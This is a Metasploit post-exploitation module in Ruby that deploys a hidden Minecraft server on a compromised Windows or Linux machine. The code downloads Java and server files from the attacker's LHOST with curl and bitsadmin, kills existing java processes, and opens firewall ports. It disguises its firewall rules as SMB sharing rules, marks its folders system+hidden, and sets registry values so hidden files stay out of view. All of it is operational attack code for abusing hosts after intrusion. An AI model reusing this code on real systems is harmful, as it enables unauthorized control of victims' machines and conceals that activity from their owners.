require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/exploit/exe'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/post/linux/priv'

class Metasploit3 < Msf::Post
	Rank = ExcellentRanking

	include Post::Common
	include Exploit::EXE
	include Post::File
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Registry
	include Msf::Post::Linux::Priv

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Metaminecraft',
			'Description'   => %q{
				This module will upload a standalone java + minecraft install, open firewall ports as necessary, and then run the server
			},
			'License'       => MSF_LICENSE,
			'Author'        => 'Rohan Vazarkar',
			'Platform'      => [ 'win', 'linux' ],
			'SessionTypes'  => [ 'meterpreter','shell' ],
			'Targets'       => [ [ 'Windows', {} ], 'Linux', {} ],
			'DefaultTarget' => 0
		))

		register_options(
			[
				OptInt.new('mcport',		[true,"The port on which your minecraft server will run on (must be pre-configured!)",25565	]),
				OptAddress.new('LHOST', [true, 'IP for this machine.']),
			], self.class)
	end

	def run
		case session.type
		when "shell"
			if (session.platform =~ /win/)
				#Its trivial to upgrade to meterpreter, and the module works better that way.
				print_status("Upgrade to Meterpreter first!")
				return
			else
				#Linux shells work great.
				print_status("Running as a linux shell!")
				linshell
				return
			end
		when "meterpreter"
			if session.sys.config.sysinfo["OS"].include?"Windows"
				#This is money for Windows
				print_status("Running as windows meterpreter")
				winmeter
				return
			else
				#Does anyone actually use Linux Meterpreter?
				print_status("Linux Meterpreter Not Supported :(")
				return
			end
		end
	end

	#This is our routine for Linux Shells
	def linshell
		if not is_root?
			print_status("Need root!")
			return
		end
		#Lets put our stuff in tmp.
		cmd_exec("cd /tmp")

		#Kill java processes that already exist
		cmd_exec("killall -9 java")

		basepath = ::File.join(Msf::Config.install_root,"data","post")

		#Lets download java from our webserver
		zip = ::File.join(basepath,"7za")
		
		#Download our java archive to the victim
		print_status("Uploading Java")
		lhost = datastore["LHOST"]
		output = cmd_exec("curl -O http://#{lhost}/linjava.7z")

		if output.length > 0
			vprint_status("#{output}")
		end

		cmd_exec("mv linjava.7z .j.7z")

		#Next, we need 7zip on the other end!
		print_status("Uploading 7zip")
		output = cmd_exec("curl -O http://#{lhost}/7za")

		if output.length > 0
			vprint_status("#{output}")
		end

		cmd_exec("chmod +x 7za")

		#Next lets download minecraft from our web server
		print_status("Uploading Minecraft")
		output = cmd_exec("curl -O http://#{lhost}/mcs.jar")

		if output.length > 0
			vprint_status("#{output}")
		end
		#Create a directory to store all the minecraft server files. Make sure its hidden!
		cmd_exec("mkdir .mcs")
		#Move our server to our new directory and make it hidden as well
		cmd_exec("mv mcs.jar .mcs/.mcs.jar")

		print_status("Extracting Java")
		
		#Extract java. Our archive contains a folder called .jre, so its also hidden!
		cmd_exec("./7za x .j.7z -y >nul")
		cmd_exec("cd .jre/bin")
		#Make java executable
		cmd_exec("chmod +x java")

		print_status("Running minecraft")
		cmd_exec("cd /tmp")
		#Run minecraft using screen, otherwise our shell crashes. Metasploit problem =(
		cmd_exec("screen -d -m .jre/bin/java -jar .mcs/.mcs.jar nogui")

		port = 0
		if datastore["mcport"] and datastore["mcport"] != 0
			port = datastore["mcport"]
		else
			#Default port for MC server
			port = 25565
		end

		#Add our port to the firewall, both in an out
		print_status("Setting IPTables rules")
		cmd_exec("iptables -A INPUT -p tcp --dport #{port} -j ACCEPT")
		cmd_exec("iptables -A OUTPUT -p tcp -j ACCEPT")

		#Delete all the files we no longer need!
		print_status("Cleaning up!")
		cmd_exec("rm .j.7z")
		cmd_exec("rm .7za")
	end

	#This is our routine for Windows Meterpreter
	def winmeter
		#First lets make sure we're system
		if not is_system?
			print_error("Need system to properly run this module. Get system first!")
			return
		end

		#Move to system32 folder so we have access to stuff
		session.fs.chdir("C\\\\Windows\\\\system32")

		#Murderfy Java if it's already running. Oops! We need this so minecraft doesn't freak out on subsequent runs of this module
		session.sys.process.execute("cmd.exe","/c taskkill /f /im java.exe",{'Hidden'=> true})

		#We're going to dump all our crap in the temp directory.
		temppath = session.fs.file.expand_path("%TEMP%");

		basepath = ::File.join(Msf::Config.install_root,"data","post")

		#We're going to upload a 7zip executable to make sure we don't rely on any tools on the target system
		zip = ::File.join(basepath,"7za.exe")
		#Likewise for Java
		java = ::File.join(basepath,"winjava.7z")
		#And our zipped up server
		mc = ::File.join(basepath,"mc.zip")


		ziptarget = "#{temppath}\\7za.exe"
		uploadroutine(ziptarget,zip,"7zip")

		javatarget = "#{temppath}\\jre.7z"
		uploadroutine(javatarget,java,"Java")

		mctarget = "#{temppath}\\mc.zip"
		uploadroutine(mctarget,mc,"Minecraft")

		#We need to extract Java from our 7zip file
		begin
			print_status("Extracting Java")
			r = session.sys.process.execute(ziptarget,"x #{javatarget} -o#{temppath} -y",{'Hidden' => true,'Channelized' => true})


			while (d = r.channel.read)
				#Let extraction finish before we exit out
			end
			r.channel.close
			r.close
		rescue Exception => e
			print_error("Error extracting Java")
		end

		#Now lets extract minecraft from its zip file
		begin
			print_status("Extracting Minecraft")

			r = session.sys.process.execute(ziptarget,"x #{mctarget} -o#{temppath} -y",{'Hidden' => true,'Channelized' => true})

			while (d = r.channel.read)
				#Let extraction finish before we exit out
			end
			r.channel.close
			r.close
		rescue Exception => e
			print_error("Error extracting Minecraft")
		end

		#We need to modify some firewall rules here
		print_status("Modifying firewall rules")
		port = 0
		if datastore["mcport"] and datastore["mcport"] != 0
			port = datastore["mcport"]
		else
			#Default port for MC server
			port = 25565
		end

		intro = "/c netsh advfirewall firewall add rule"
		#We're going to hide our rules as a regular SMB Rule. Its not perfect, but it's something.
		namein = "File and Printer Sharing (SMB-In)"
		nameout = "File and Printer Sharing (SMB-Out)"
		indesc = "Inbound rule for File and Printer Sharing to allow Server Message Block transmission and reception via Named Pipes. [TCP 445]"
		outdesc = "Outbound rule for File and Printer Sharing to allow Server Message Block transmission and reception via Named Pipes. [TCP 445]"

		#First, we'll allow java.exe in and out so the target doesn't see a popup asking for permission
		session.sys.process.execute("cmd.exe","#{intro} name=\"#{namein}\" description=\"#{indesc}\" dir=in action=allow program=#{temppath}\\java\\bin\\java.exe enable=yes", {'Hidden' => true})
		session.sys.process.execute("cmd.exe","#{intro} name=\"#{nameout}\" description=\"#{outdesc}\" dir=out action=allow program=#{temppath}\\java\\bin\\java.exe enable=yes", {'Hidden' => true})
		#Next, we'll open ports for minecraft (TCP In and Out)
		session.sys.process.execute("cmd.exe","#{intro} name=\"#{namein}\" description=\"#{indesc}\" dir=in action=allow protocol=tcp localport=#{port}", {'Hidden' => true})
		session.sys.process.execute("cmd.exe","#{intro} name=\"#{nameout}\" description=\"#{outdesc}\" dir=out action=allow protocol=tcp localport=#{port}", {'Hidden' => true})

		#What we've been waiting for - lets run the server!
		jbinpath = "#{temppath}\\Java\\bin\\java.exe"
	
		print_status("Running the server")
		session.fs.dir.chdir("#{temppath}\\server")
		session.sys.process.execute(jbinpath," -jar #{temppath}\\server\\minecraft_server.jar nogui",{'Hidden' => true})
		
		print_status("Minecraft server should be running! Happy fun times!")

		#Cleanup
		session.fs.dir.chdir("C:\\\\Windows\\\\system32")

		print_status("Cleaning up stuff")
		session.sys.process.execute("cmd.exe","/c del #{javatarget}",{'Hidden'=>true})
		session.sys.process.execute("cmd.exe","/c del #{ziptarget}",{'Hidden'=>true})
		session.sys.process.execute("cmd.exe","/c del #{mctarget}",{'Hidden'=>true})

		#Hide our folders using system + hidden to make it harder to easily find
		print_status("Hiding our folders")
		session.sys.process.execute("cmd.exe","/c attrib +s +h #{temppath}\\Java",{'Hidden'=>true})
		session.sys.process.execute("cmd.exe","/c attrib +s +h #{temppath}\\server",{'Hidden'=>true})

		#Modify some registry keys to enforce hiding
		print_status("Setting Registry Keys")
		registry_setvaldata("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced","Hidden",2,"REG_DWORD")
		registry_setvaldata("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced","ShowSuperHidden",0,"REG_DWORD")

		print_status("All done!")

	end

	#All this code was written...but then I realized Windows Shell isn't exactly the best payload. Regardless, it's here for fun!
	def winshell
		if not is_system?
			print_error("Need system to properly run this module. Get system first!")
			return
		end

		cmd_exec("cd %tmp%")

		cmd_exec("taskkill /f /im java.exe")

		lhost = datastore["LHOST"]

		
		print_status("Uploading 7zip")
		output = cmd_exec("bitsadmin /transfer n http://#{lhost}/7za.exe %tmp%\\7za.exe")

		if output.length > 0
			vprint_status("#{output}")
		end

		print_status("Downloading Java")

		output = cmd_exec("bitsadmin /transfer n http://#{lhost}/winjava.7z %tmp%\\jre.7z")

		if output.length > 0
			vprint_status("#{output}")
		end

		print_status("Uploading Minecraft")

		output = cmd_exec("bitsadmin /transfer n http://#{lhost}/mc.zip %tmp%\\mc.zip")

		if output.length > 0
			vprint_status("#{output}")
		end


		session.response_timeout=120
		print_status("Extracting Java")
		cmd_exec("7za x jre.7z -y")
		print_status("Extracting Minecraft")
		cmd_exec("7za x mc.zip -y")

		print_status("Modifying firewall rules")
		port = 0
		if datastore["mcport"] and datastore["mcport"] != 0
			port = datastore["mcport"]
		else
			#Default port for MC server
			port = 25565
		end

		intro = "netsh advfirewall firewall add rule"
		#We're going to hide our rules as a regular SMB Rule. Its not perfect, but it's something.
		namein = "File and Printer Sharing (SMB-In)"
		nameout = "File and Printer Sharing (SMB-Out)"
		indesc = "Inbound rule for File and Printer Sharing to allow Server Message Block transmission and reception via Named Pipes. [TCP 445]"
		outdesc = "Outbound rule for File and Printer Sharing to allow Server Message Block transmission and reception via Named Pipes. [TCP 445]"

		#First, we'll allow java.exe in and out so the target doesn't see a popup asking for permission
		cmd_exec("runas /noprofile /user:Administrator #{intro} name=\"#{namein}\" description=\"#{indesc}\" dir=in action=allow program=%tmp%\\java\\bin\\java.exe enable=yes")
		cmd_exec("runas /noprofile /user:Administrator #{intro} name=\"#{nameout}\" description=\"#{outdesc}\" dir=out action=allow program=%tmp%\\java\\bin\\java.exe enable=yes")
		#Next, we'll open ports for minecraft (TCP In and Out)
		cmd_exec("runas /noprofile /user:Administrator #{intro} name=\"#{namein}\" description=\"#{indesc}\" dir=in action=allow protocol=tcp localport=#{port}")
		cmd_exec("runas /noprofile /user:Administrator #{intro} name=\"#{nameout}\" description=\"#{outdesc}\" dir=out action=allow protocol=tcp localport=#{port}")

		print_status("Cleaning up stuff")
		cmd_exec("del jre.7z")
		cmd_exec("del 7za.exe")
		cmd_exec("del mc.zip")

		#Hide our folders using system + hidden to make it harder to easily find
		print_status("Hiding our folders")
		cmd_exec("attrib +s +h Java")
		cmd_exec("attrib +s +h server")

		#Modify some registry keys to enforce hiding
		print_status("Setting Registry Keys")
		#registry_setvaldata("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced","Hidden",2,"REG_DWORD")
		#registry_setvaldata("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced","ShowSuperHidden",0,"REG_DWORD")

		cmd_exec("START /B %tmp%\\Java\\bin\\java.exe -jar %tmp%\\server\\minecraft_server.jar nogui")
	end

	#Our function to upload stuff
	def uploadroutine(target,file,name)
		begin
			print_status("Uploading #{name}")

			session.fs.file.upload_file("#{target}","#{file}")

			print_status("Uploaded #{name}")
		rescue Exception => e
			print_error("Error uploading #{name}")
		end
	end

end